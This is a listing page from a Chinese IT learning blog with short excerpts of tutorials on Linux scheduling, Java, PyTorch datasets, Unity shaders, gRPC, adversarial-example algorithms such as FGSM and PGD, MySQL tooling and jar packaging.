SCHED_OTHER策略的静态优先级总是为0，对于该策略列表上的线程，调度器是基于动态优先级（dynamic priority）来调度的，动态优先级是跟nice中相关(nice值可以由接口nice, setpriority,sched_setattr来设置)，该值会随着线程的运行时间而动态改变，以确保所有具有SCHED_OTHER策略的线程公平运行。在Linux上，nice值的范围是-20到+19，默认值为0；nice值越大则优先级越低，相比高nice值（低优先级）的进程，低nice值（高优先级）的进程可以获得更多的处理器时间。使用命令ps -el查看系统的进程列表，其中NI列就是进程对应的nice值；使用top命令，看到的NI列也是nice值。运行命令的时候可用nice –n xx cmd来调整cmd任务的nice值，xx的范围是-20~19之间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1176450a4bfc133ebb85a5e1119267f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57da9910632ea73e94214ec75773b7ac/" rel="bookmark">
			面向对象编程（OOP)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象编程（OOP) 面向对象（OOP Object Orient Programming）是java编程的核心思想。
三大特性：封装，继承，多态
主要组成：类；对象；属性；动作（方法）
类：对某一类有相同特征的事物的抽象，或者说具有同种属性和行为的对象的集合，比如电力机车。
对象：表示现实中该类事物的个体，是类的具体实现，比如和谐号动车组就是电力机车的一个对象。
属性：该类事物的共有特征，实际就是变量，但又和变量有点区别，比如电力机车具有功率大，运行速度高，加速快，自身负重低，清洁环保，能源利用率高等属性。
动作（方法）：该类事物共有的功能，比如可以电力机车可以牵引车厢，通电工作等。
它们四者的关系：
1.类中包含属性和方法；
2.对象由类创建出（类实例化出对象）；
3.对象中可以表现出具体的属性值和方法
小练习：建立一个完整的类：
package com.xiaobai; //建立一个电力机车类 public class electricLocomotive { //类的属性 //型号 public String model; //速度 public int velocity; //功率 public double power; /**类的功能（方法） * 方法的语法： * [访问修饰符] 返回值类型 方法名([数据类型 变量名，…]){ * …… * } * 1.访问修饰符可写可不写； * 2.返回值类型：如果方法执行完不返回数据,写void * 如果要返回数据，写对应的数据类型 * 3.方法名遵循驼峰原则，见名之意 * 4.参数列表：可以不需要参数，也可以设计参数，写法： * 数据类型 变量名（就是变量声明），多个的用逗号隔开即可 */ public void transportation() { System.out.print("运输"); public void dissipation(){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57da9910632ea73e94214ec75773b7ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/079782dee6f0be202106e1487b47e664/" rel="bookmark">
			pytorch处理CK&#43;数据集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CK+数据集介绍 CK+数据库是在 Cohn-Kanade Dataset 的基础上扩展来的，包含表情的label和Action Units 的label。这个数据库包括123个subjects, 593 个 image sequence，每个image sequence的最后一张 Frame 都有action units 的label，而在这593个image sequence中，有327个sequence 有 emotion的 label。这个数据库是人脸表情识别中比较流行的一个数据库，很多文章都会用到这个数据做测试。
CK+数据库一共有4个压缩文件：
extended-cohn-kanade-images.zip：共有123个受试者的593个序列，在峰值帧进行FACS编码。所有序列都是从中性面到峰值表情。Landmarks.zip：所有序列都是AAM跟踪的，每个图像有68个点的Landmarks。FACS_labels.zip：对于每个序列（593），只有1个FACS文件，这是最后一帧（峰值帧）。文件的每一行对应一个特定的AU，然后是强度。Emotion_labels.zip：593个序列中只有327个具有情感序列，情绪类别分别是0=neutral, 1=anger, 2=contempt, 3=disgust, 4=fear, 5=happy, 6=sadness, 7=surprise。 百度云链接：https://pan.baidu.com/s/182ZigVgfhmO-YnLy3ip1dQ
百度云密码：CKCK
CK+数据集存为.h5文件 首先对CK+数据集切割后的图片文件保存为为.h5文件，具体代码如下所示：
#create data and label for CK+ #0=anger,1=disgust,2=fear,3=happy,4=sadness,5=surprise,6=contempt #contain 135,177,75,207,84,249,54 images import csv import os import numpy as np import h5py import skimage.io ck_path = r'Dataset\CK+' anger_path = os.path.join(ck_path, 'anger') disgust_path = os.path.join(ck_path, 'disgust') fear_path = os.path.join(ck_path, 'fear') happy_path = os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/079782dee6f0be202106e1487b47e664/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2bb2dce7431aee040f418366b5ce1b1/" rel="bookmark">
			Unity中的半透明阴影
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity中的半透明阴影 在Unity中渲染半透明阴影可以使用Unity提供的dither texture。在这之前，先考虑一般半透明物体的渲染流程：
设置render queue为Transparent，这样不透明的物体会先渲染，然后位于被不透明物体遮挡的透明物体就可以不必渲染，减少开销设置render type为Transparent，便于一些replacement操作设置blend mode，例如fade是srcBlend = SrcAlpha，dstBlend = OneMinusSrcAlpha，而Transparent是srcBlend = One，dstBlend = OneMinusSrcAlpha关闭深度写入，zwrite = false Unity中的半透明阴影本质上是不透明的，只是对dither texture进行采样，根据采样的结果，clip掉一些fragment，使得shadow caster过程中只有一部分阴影信息会被绘制到shadowmap上。Unity builtin shaders提供的参考写法如下：
struct Interpolators { UNITY_VPOS_TYPE vpos : VPOS; ... }; float4 MyShadowFragmentProgram (Interpolators i) : SV_TARGET { ... half alphaRef = tex3D(_DitherMaskLOD, float3(vpos.xy*0.25,alpha*0.9375)).a; clip(dither - 0.01); ... } vpos表示的是当前像素在screen space下的坐标，_DitherMaskLOD是一个尺寸为4×4×16的3D纹理，这个可以从frame debug中看出：
这个纹理长啥样呢？我们可以写一个shader手动把它输出：
Shader "Custom/TextureViewShader" { Properties { } SubShader { Tags { "RenderType"="Opaque" } LOD 100 Pass { CGPROGRAM #pragma vertex vert #pragma fragment frag #include "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2bb2dce7431aee040f418366b5ce1b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/071f14958f34c32f72c093158ea1ac77/" rel="bookmark">
			深度学习基础知识（人工智能）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导读：人工智能时代已经到来，AlohaGO的击败李世石成为了围棋界的神话，让许多人震惊不已。那么AlphaGo是怎么产出的呢?它是源自于人工智能的深度学习。
这是小编的其他文章,希望对大家有所帮助,点击即可阅读
人工智能常用的十大算法 人工智能数学基础（一） 人工智能数学基础(二)
人工智能数学基础（三） 人工智能数学基础（四）
另外我还整理了整整200G的人工智能学习笔记、课程视频、面试宝典一并可以无套路免费
分享给大家！扫描文末二维码加V免费咨询学习问题领取资料
深度学习是什么 深度学习是一种机器学习的方法，它试图使用包含复杂结构或由多重非线性变换构成的多个处理层(神经网络)对数据进行高层抽象的算法。深度学习可以理解为神经网络的发展，神经网络是对人脑或生物神经网络基本特征进行抽象和建模，可以从外界环境中学习，并以与生物类似的交互方式适应环境。 1. 最小化代价函数优化方法：BGD、SGD、MBGD、动量、NAG、Adagrad、AdaDelta、Adam、AMSGrad、牛顿法；
2. 前馈神经网络的隐藏单元不一定在所有的输入点上可微；
3. CNN最大池化能产生一定程度的平移不变性；
4. 向量范数表征向量空间的大小：
CNN：LeNet、AlexNet、VGGNet、GoogLeNet、ResNet数据增强技术：翻转、裁剪、缩放、颜色抖动、平移 Batch Size定义：一次训练所选取的样本数。
Batch Size影响：影响模型的优化程度和速度。同时其直接影响到GPU内存的使用情况，假如GPU内存不大，该数值最好设置小一点。使得梯度下降方向更加准确
划分训练集、验证集、测试集：训练集：验证集：测试集的划分比例为6:2:2
一阶优化方法：RMSProp
深度学习关系图
激活函数分类
合理的稀疏比例：70~80%，屏蔽特征过多容易出现欠拟合。正则化在深度神经网络训练时的作用 正则化可以很好的解决模型过拟合的问题，常见的正则化方式有L2正则化和dropout，但是正 则化是以牺牲模型的拟合能力来达到平衡的，因此在对训练集的拟合中有所损失。
3. L1正则化和L2正则化
L1正则化可以产生稀疏值矩阵，即产生一个稀疏模型，可以用于特征选择和解决过拟合。能够帮助模型找到重要特征，而去掉无用特征或影响甚小的特征。
L2 让所有特征的系数都缩小, 但不会减为0，它会使优化求解稳定快速。所以L2适用于特征之间没有关联的情况。
L2正则化可以防止模型过拟合；一定程度上，L1也可以防止过拟合
4. 激活函数的作用
激活函数给神经元引入了非线性因素，使得神经网络可以任意逼近任何非线性函数，深层神经网络表达能力更强大，可以应用到众多的非线性模型中。
5. Sigmoid函数
特点：它能够把输入的连续实值变换为0和1之间的输出，特别的，如果是非常大的负数，那么输出就是0；如果是非常大的正数，输出就是1.
缺点：在深度神经网络中梯度反向传递时导致梯度爆炸和梯度消失，其中梯度爆炸发生的概率非常小，而梯度消失发生的概率比较大；Sigmoid 的 output 不是0均值；其解析式中含有幂运算，计算机求解时相对来讲比较耗时。
6. Relu函数
特点：解决了gradient vanishing问题 (在正区间)；计算速度非常快，只需要判断输入是否大于0；收敛速度远快于sigmoid和tanh
缺点：ReLU的输出不是0均值；某些神经元可能永远不会被激活，导致相应的参数永远不能被更新。
7. AdaGrad算法
AdaGrad算法就是将每一个参数的每一次迭代的梯度取平方累加后在开方，用全局学习率除以这个数，作为学习率的动态更新。
其中，r为梯度累积变量，r的初始值为0。ε为全局学习率，需要自己设置。δ为小常数，为了数值稳定大约设置为10^-7
8. 优化算法的选择
如果输入数据是稀疏的，选择任一自适应学习率算法可能会得到最好的结果。无需调整学习率，选用默认值就可能达到最好的结果。
RMSprop, Adadelta, 和 Adam 非常相似，在相同的情况下表现都很好。
偏置校验让Adam的效果稍微比RMSprop好一点
进行过很好的参数调优的SGD+Momentum算法效果好于Adagrad/Adadelta
如果不知道选择哪种优化算法，就直接选Adam吧
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/071f14958f34c32f72c093158ea1ac77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/840c0f2c8bdf6046f2ba9c4d9856e45e/" rel="bookmark">
			element Progress 环形进度条渐变样式修改
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最终效果图
&lt;el-progress class="circle0" :width="140" type="circle" :stroke-width="20" percentage="测试" &gt;&lt;/el-progress&gt; &lt;svg width="100%" height="0"&gt; &lt;defs&gt; &lt;linearGradient id="write" x1="0%" y1="0%" x2="100%" y2="0%"&gt; &lt;stop offset="0%" style="stop-color: #86e79f" stop-opacity="0.8"&gt;&lt;/stop&gt; &lt;stop offset="100%" style="stop-color: #fbdd97" stop-opacity="1"&gt;&lt;/stop&gt; &lt;/linearGradient&gt; &lt;/defs&gt; &lt;/svg&gt; .circle0 /deep/ { .el-progress__text { background-image: -webkit-linear-gradient(bottom, #d3fbfb, #fbdd97); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; } svg &gt; path:nth-child(2) { stroke: url(#write); } .el-progress-circle__track { stroke: rgba(251, 221, 151, 0.2); } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca597feba5e7628534d5e1df02e330f8/" rel="bookmark">
			gRPC-Java（二）：一个Demo熟悉gRPC的四种模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		gRPC提供了四种提供服务的模式，它们分别是：
① 简单模式（Unary RPCs）；
② 客户端流模式（Client streaming RPCs）；
③ 服务端流模式（Server streaming RPCs）；
④ 双向流模式（Bidirectional streaming RPCs ）
简单模式：客户端发出单个请求，服务端返回单个响应。客户端流模式：客户端将连续的数据流发送到服务端，服务端返回一个响应；用在客户端发送多次请求到服务端情况，如分段上传图片场景等。服务端流模式：客户端发起一个请求到服务端，服务端返回连续的数据流；一般用在服务端分批返回数据的情况，客户端能持续接收服务端的数据。双向流模式：双向流就是服务端流和客户端流的整合，请求和返回都可以通过流的方式交互。 接下来，我们将通过官网的一个例子来学习一下这四种模式。
还是用到gRPC-Java（一）：构建一个使用Java语言的gRPC工程中已经创建好的项目，完整项目链接附在文末。
##一、编写.proto文件并生成代码
这里面涉及到一些protocol-buffers的语法，可以暂时不用深究，不影响理解大局。
下面的router_guide.proto文件中，使用service关键字定义了一个名为RouteGuide的服务，这个RouteGuide服务中又提供了四个使用rpc关键字定义的RPC方法，分别是：
简单模式：GetFeature；
服务端流模式：ListFeatures；
客户端流模式：RecordRoute；
双向流模式：RouteChat。
区别这四种模式的方式就是，在流模式的rpc方法参数前面加stream。举个例子：
服务端流模式ListFeatures，是这么定义的：
rpc ListFeatures(Rectangle) returns (stream Feature) {}
响应体Feature前面加了stream。
客户端流模式RecordRoute，是这么定义的：
rpc RecordRoute(stream Point) returns (RouteSummary) {}
请求体Point前面加了stream。
双向流模式RouteChat，则是在请求和响应体之前都加stream：
rpc RouteChat(stream RouteNote) returns (stream RouteNote) {}
OK，了解了proto文件里面的基本内容之后，我们继续。本文中实例程序所需要的完整的route_guide.proto文件如下：
syntax = "proto3"; option java_multiple_files = true; option java_package = "com.zhb.grpc.examples.routeguide"; option java_outer_classname = "RouteGuideProto"; option objc_class_prefix = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca597feba5e7628534d5e1df02e330f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70fb1c4ad969a918d439021b2b858875/" rel="bookmark">
			[Leetcode]5897. 将数组分成两个数组并最小化数组和的差
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【题目描述如下】
给你一个长度为 2 * n 的整数数组。你需要将 nums 分成 两个 长度为 n 的数组，分别求出两个数组的和，并 最小化 两个数组和之 差的绝对值 。nums 中每个元素都需要放入两个数组之一。
请你返回 最小 的数组和之差。
示例 1：
输入：nums = [3,9,7,3]
输出：2
解释：最优分组方案是分成 [3,9] 和 [7,3] 。
数组和之差的绝对值为 abs((3 + 9) - (7 + 3)) = 2 。
示例 2：
输入：nums = [-36,36]
输出：72
解释：最优分组方案是分成 [-36] 和 [36] 。
数组和之差的绝对值为 abs((-36) - (36)) = 72 。
示例 3：
输入：nums = [2,-1,0,4,-2,-9]
输出：0
解释：最优分组方案是分成 [2,4,-9] 和 [-1,0,-2] 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70fb1c4ad969a918d439021b2b858875/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9989e6a6edfedb9a58c7de18f4de984a/" rel="bookmark">
			在vs2019连接linux环境下，mysql头文件报错的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在日常的linux环境开发中，为了提高开发的效率，往往有的时候会在windows环境下写代码，然后在linux环境下执行我们的程序，但是今天在用vs2019连接linux并在vs2019下写代码时加入了mysql的头文件，发现系统报错：无法打开源文件"mysql/mysql.h",在我经过检查之后确保我的乌班图是装了mysqlclient了的，而且vs2019也做了库依赖项的链接，如下图：
但是我的vs2019还给我报了一堆的错误信息，看着下面一堆的报错，让我着实有点儿mb
经过我翻阅很多的资料和向相关的大佬请教以后才发现了其中的猫腻，废话不多说，下面我再带大家粗略的了解一下其中的缘由，避免有的小伙伴跟我一样踩同样的坑。
我们可以看到下面这张图，这是我项目名称下的外部依赖项，是从linux 下同步过来的，
外部依赖项里面有很多的头文件，我们随意选取一个文件，将其完整的路径复制，然后再windows中打开文件夹，将路径粘贴到搜索框，进入到\usr\include，后面的先删除，我们只需要进入到\usr\include里即可,因为mysql的头文件一般都是安装在/usr/include/下面的，而vs2019里面的外部依赖项又是从我们的linux下的/usr/include下面同步过来的。
进入到\usr\include内部以后我们再进入到我们的linux下的/usr/include/,如下图：
此时我们会惊奇的发现，/usr/include中有mysql,而我们的vs2019从linux相同路径下同步过来的头文件里竟然找不到mysql，所以再vs中自然是要不错(找不到外部依赖)
那么这个问题怎么解决呢？
解决方案：
1 我们再linux的/usr/include下执行 tar -zcvf mysql.tgz mysql(超级用户权限)将/usr/include/下的mysql打包
执行ls发现/usr/include/下多了个mysql.tgz
2.执行 ：cp mysql.gz /home/zhangfeng/将mysql.tgz拷贝到/home/zhangfeng目录下(注意:zhangfeng是我linux虚拟机的用户名，用户名根据自己的写就行)
3. 使用共享文件的方式(前提得安装samba服务器，不懂的小伙伴可以私我哦)访问/home/zhangfeng/
点击回车后发现share文件夹里面多了mysql.tgz压缩包，
4. 我们将这个压缩包复制到我们一开始打开的那个\usr\include路径下(该路径下的所有文件由vs2019从linux/usr/include同步过来)
将其解压 ，此时该文件夹下多了一个名为：mysql的子文件夹
此时这一步完成以后我们先关闭我们的vs2019的项目，重新打开，发现讲过一番的骚操作mysql/mysql.h的报错全部消失，问题得以解决。
在此运行项目发现结果相当的nice...
好了，我得分享就到这里了，有说的不清楚或者不准确的地方，各位小伙伴可以再下方留言，我们一起学习一起讨论哦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/370b7b731ecaddf271c396638aa074ca/" rel="bookmark">
			对抗样本生成算法-FGSM、I-FGSM、ILCM、PGD
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对抗样本生成算法 一、FGSM(Fast Gradient Sign Method)1.FGSM基本思想2.FGSM算法流程3.FGSM扰动有效性分析 二、I-FGSM/BIM(Iterative FGSM)1.I-FGSM与FGSM的区别2.I-FGSM算法流程 三、ILCM(Iterative Least-likely Class Method)1.ILCM与I-FGSM的区别2.ILCM算法流程 四、PGD(Projected Gradient Descent)1.PGD与I-FGSM的区别2.PGD指导对抗样本防御3.PGD指导对抗样本生成（算法流程） 五、PGD与I-FGSM的区别 一、FGSM(Fast Gradient Sign Method) 1.FGSM基本思想 Fast gradient sign method缩写为FGSM，其思想来源于“随机梯度下降使得模型对于输入图像输出的损失函数值变小，从而使网络输出正确的预测，那么如果将计算得出的损失值加到输入图像上，使得网络输出的损失值变大，即可使网络趋向于输出错误的预测结果”。
2.FGSM算法流程 需要进行对抗样本生成的原始图片 x o r i x_{ori} xori​，其标签为 y y y，一个良好的分类模型 M M M，分类模型 M M M的参数 θ \theta θ，同时需要使用FGSM生成一个攻击噪声 η \eta η。
首先使用分类模型 M M M对输出 x o r i x_{ori} xori​进行一个前向传播，可以计算ß出损失函数值 ∇ x o r i J ( θ , x o r i , y ) \nabla_{x_{ori}} J(\theta,x_{ori},y) ∇xori​​J(θ,xori​,y)，因为损失计算得到的雅可比矩阵的元素大小不均，所以为了控制损失值的无穷范数（每一个像素的损失值的最大值），所以使用符号函数 s i g n ( ) sign() sign()提取梯度的方向，而不是用梯度的值，同时我们使用一个参数 ε \varepsilon ε来控制攻击噪声的幅值，满足 ∥ η ∥ ∞ &lt; ε \left \| \eta \right \|_\infty&lt;\varepsilon ∥η∥∞​&lt;ε。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/370b7b731ecaddf271c396638aa074ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59205fb49bde609f875c4787af83a07a/" rel="bookmark">
			AI Studio 永久性使用pytorch框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（亲测有效）
登录百度AI Studio创建项目
网址：百度 AI Studio
步骤
1.选择Notebook类型，然后下一步 2.我选择的AI Studio经典版；PaddlePaddle 选择2.0版本，点击下一步 3.项目名称、标签、描述自己根据需求设置；注：这里这个数据集选项—1.如果是自己的数据集，选择创建数据集，只需要把自己的数据集在电脑中压缩，然后以压缩包的形式上传即可。2.如果是使用他人的公开数据集直接添加数据集即可。 4.创建项目中的环境 4.1 上步骤创建完成以后，显示如下界面（下面这个界面是添加别人的数据集显示的界面） 4.2 下面是创建自己数据集显示的界面，我们会发现少了notebook编译界面以及启动环境选项等 如上图所示，再次点击创建项目，这里你会发现和第一次创建项目的界面一模一样。此时类型继续选择Notebook，PaddlePaddle 选择2.0版本，项目的名称简介再写一次，此时你刚才上传的自己的数据集是存在的，点击创建即可。
5. 上步骤创建完成后，生成的界面就如下所示 5.1 启动环境后界面如下： 6. 准备自己的程序以及数据集 在生成的Notebook的编译中就说了（如上图所示），work文件夹下的内容是永久保留的，所以我们把程序都放在work文件夹下。在此之前，我们需要只在在住文件夹下或者在work文件夹下把自己的程序压缩包上传，直接就有上传的功能，注意，程序中可以包含预训练的权值文件（也就是.pth文件）但是不能包含数据集，因为数据集在你创建项目时已经添加了，此时在你的工作环境中，有data文件夹下就是你的数据集。你要做的就是打包程序，解压缩程序到work文件夹下，然后将你的数据集也解压缩到你解压程序的文件对应的数据集的路径下即可。
解压缩的程序直接在Notebook下新添加一栏运行即可：
6.1 解压程序压缩包 #解压自己上传的程序压缩包，解压到work文件夹下，然后自己根据需要重命名 import zipfile f = zipfile.ZipFile("mobilenet-v4-torch-AI.zip",'r') for file in f.namelist(): f.extract(file,"work/")#将文件解压到当前文件夹下 f.close() 6.2 解压数据集到解压程序的路径下 #data111434/JPEGImages.zip这是自己的图片路径，自己选择;v4/VOCdevkit/VOC2007/是自己要解压缩的位置 !unzip /home/aistudio/data/data111434/JPEGImages.zip -d work/v4/VOCdevkit/VOC2007/ #data111434/Annotations.zip这是自己图片标注压缩包路径；v4/VOCdevkit/VOC2007/是自己要解压缩的位置 !unzip /home/aistudio/data/data111434/Annotations.zip -d work/v4/VOCdevkit/VOC2007/ 为了更直观，附上两张图片方便理解：
7. 配置环境 在配置环境之前，我们要在该网站下载Minianaconda：Miniconda3，至于下载的版本建议：Miniconda3-4.7.12.1-Linux-x86_64.sh。浏览器下载到本地，然后同样在AI Studio平台work文件夹下新建conda3文件夹（conda3是我自己建的文件夹，建议采取我这个），然后将本地下载的sh文件上传到新建的conda3文件夹下（在conda3文件夹下直接上传sh文件更方便）。接下来就是一连串的配置环境：如上图所示在终端输入：
#第一步 cd work/conda3 #第二步 #一直回车或者yes,直到输出如下的路径，然后在路径后输入 #第三步 bash Miniconda3-4.7.12.1-Linux-x86_64.sh #第三步 *conda3相当于把这个虚拟的软件找一个安装路径，work文件夹下，名称自取 #出现选择：选择yes ~/work/*conda3 #第四步 激活anaconda环境 source ~/work/*conda3/bin/activate或者source activate #第五步 在激活的anaconda环境中配置自己想要的环境：比如pytorch（name后为环境名，随便命名） conda create --name LYD python=3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59205fb49bde609f875c4787af83a07a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/288232953483188e26a6ae532026be33/" rel="bookmark">
			MySQL可视化工具HeidiSQL安装与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前mysql可视化工具一直使用navicat for mysql工具,后来想学一下其他的数据库,把navicat for MySQL卸载后,网上找教程下载安装了navicat premium,但是破解之后的一段时间内,激活码失效了,由于navicat for mysql工具安装也需要破解,便不想安装了,就找到这款免费的MySQL可视化工具HeidiSQL.
HeidiSQL直接在官网下载,官网地址:HeidiSQL官网地址
下载完成后,双击安装包进行安装,直接手动next安装即可.(中间安装时可手动选择安装的路径),安装完成后需要重启电脑.
重启后打开HeidiSQL,新建会话,修改会话名称,添加用户名称和密码,点击连接即可.
下图是再次打开页面
由于本人的数据库用户名是root,无密码,即直接改会话名称名localhost即好.
由于本人使用的MySQL是免安装版的MySQL.连接前需要启动MySQL.
(当然啦,先可以先点击连接,不过就是连接不上嘛,再继续启动MySQL后连接便OK啦)
启动MySQL
然后在HeidiSQL,点击连接,直接进入MySQL管理页面;
HeidiSQL,安装教程网上也有很多,就不截图了,主要是本人安装时也未截图.不知咋安装的小伙伴就继续网上找教程.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c49b0137de5f9e807b0b21a73f5fa078/" rel="bookmark">
			SonicBoom SFB（short-forwards branch）源码分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 目的 最近在研究伯克利的Sonicboom riscv CPU，其内部对于SFB（short-forwards branch）程序进行了优化操作，某些程序序列下能提升1.7倍的IPC；但是处理比较复杂，不是集中在一个模块处理，而是分散于各级pipline。而相应的描述资料又少，因此采用结合源代码和波形仿真的方式来进行一个学习研究。
2 SFB介绍 SFB翻译过来就是短向前跳分支，简单来说是一串代码序列，如下面一段C程序所示：
int max = 0 ; int maxid = −1; for ( i = 0 ; i &lt; n ; i ++) { if ( x [ i ] &gt;= max ) { max = x [ i ] ; maxid = i ; } } 这段C代码实现的是最为常见的数组里面找最大值的功能，站在程序员的角度很容易理解。对应的risc-v的汇编程序如下，其中bge指令和后面的两条MV指令组成的就是典型的SFB结构。
loop : lw x2 , 0( a0 ) bge x1 , x2 , skip mv x1 , x2 mv a1 , t 0 skip : addi a0 , a0 , 4 addi t0 , t0 , 0x1 j loop : 在汇编中可以看见每次循环（loop）都会有一条分支指令（bge）,以及该分支下的两条MV指令，分支指令不跳转（not_taken）的话就会执行两条MV指令，跳转（taken）的话就会调到标记skip的标号（label）。功能很简单，但是对于当今的高性能CPU来说，不局限于RISC-V架构，都有着很深的流水线(pipline)深度，同时针对于分支指令（Branch）会有先进的分支预测技术来预测分支指令跳转的方向，而不用等到一般处于流水线很后的读寄存器阶段（rigister read）或功能单元的执行阶段（execute）来得到实际跳转方向。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c49b0137de5f9e807b0b21a73f5fa078/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/753d7328ba9607231f4efb7bccc4c40f/" rel="bookmark">
			Java-jar包的创建与运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jar包的概念 JAR文件的全称是Java Archive File，意思是Java档案文件。是一种压缩文件，与常见的ZIP压缩文件兼容。两者最大的区别是在JAR文件中默认包含一个名为META-INF/MANIFEST.MF的清单文件，这个文件是生成JAR文件时由系统自动创建的。
Java中的许多类其实都是由jar包的形式提供的
jar包的生成 在某个包中的目录下启动命令行窗口，并输入jar -cvf myfirstjar.jar cn
其中myfirstjar为jar包的名字，cn也不要忘记带上
在用的时候呢，你的文件里有很多个类，把这些类和他们的目录一起压缩到一个文件中给别人,会显得更专业，有条理。别人拿到这个jar包之后,只要让他的classpath 的设置中包含这个jar文件,java虚拟机,在装载类的时候,就会自动解压这个jar文件,并将其当成目录,然后在目录中查找我们所要的类及类的包名和所对应的目录的结构。
使用jar包的好处 安全，可以对其进行数字签名，只让能够识别数字签名的用户使用里面的东西。加快下载速度；压缩，使文件变小，与ZIP压缩机制完全相同。包封装。能够让JAR包里面的文件依赖于统一版本的类文件。可移植性，能够在各种平台上直接使用。把一个JAR文件添加到系统的classpath环境变量之后，java通常会把这个JAR文件当做一个路径来处理。通常使用jar命令来压缩，可以把一个或多个路径全部压缩成一个JAR文件。 什么情况下使用jar包？ 当开发一个应用程序后这个应用程序包含了很多类，如果需要把这个程序提供给别人使用，通常会将这些类文件打包成一个JAR文件，把这个文件提供给别人使用。只要在别人系统的CLASSPATH环境变量中添加这个文件，则java虚拟机就可以自动在内存中解压这个jar包。
jar包的创建 命令行创建 jar命令详解 jar cf test.jar test不显示压缩过程将当前路径下的test路径下的全部内容生成一个test.jar文件，如果已经存在则被覆盖。jar cvf test.jar test显示压缩过程；jar cvfM test.jar test不生成清单文件；jar cvfm test.jar manifest.mf test自定义清单文件信息，m指定读取用户清单信息。清单文件是普通文本文件。jar cvfm test.jar a.txt test将清单文件中的key-value对提取到META-INF/MANIFEST.MF文件中。jar tf test.jar查看jar包内容；jar tf test.jar &gt; a.txt:如果jar包中的文件路径和文件非常多，用上一个命令就无法查看所有，所以用重定向将显示结果保存到文件中。jar tvf test.jar:查看详细内容；jar xf test.jar解压，将jar文件解压到当前目录下；jar xvf test.jar解压，显示解压过程的信息；jar uf test.jar Hello.class:更新test.jar中的Hello.jar文件，如果存在则覆盖，否则添加；jar uvf test.jar Hello.class：更新时显示详细信息； 创建可用jar包 jar命令-e选项，该选项指定JAR包中作为程序入口的主类的类名。
jar cvfe test.jar test.Test test
上面的命令把test目录下的所有文件都压缩到test.jar包中，并指定使用test.Test类作为程序入口。
运行上面JAR包有两种方式：
java -jar test.jarjavaw test.jar 当创建JAR包时，所有类都必须放在与包结构对应的目录结构中。就像上面-e选项指定的Test类，表明入口类为Test类。因此在JAR包下包含Test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/753d7328ba9607231f4efb7bccc4c40f/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/166/">«</a>
	<span class="pagination__item pagination__item--current">167/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/168/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>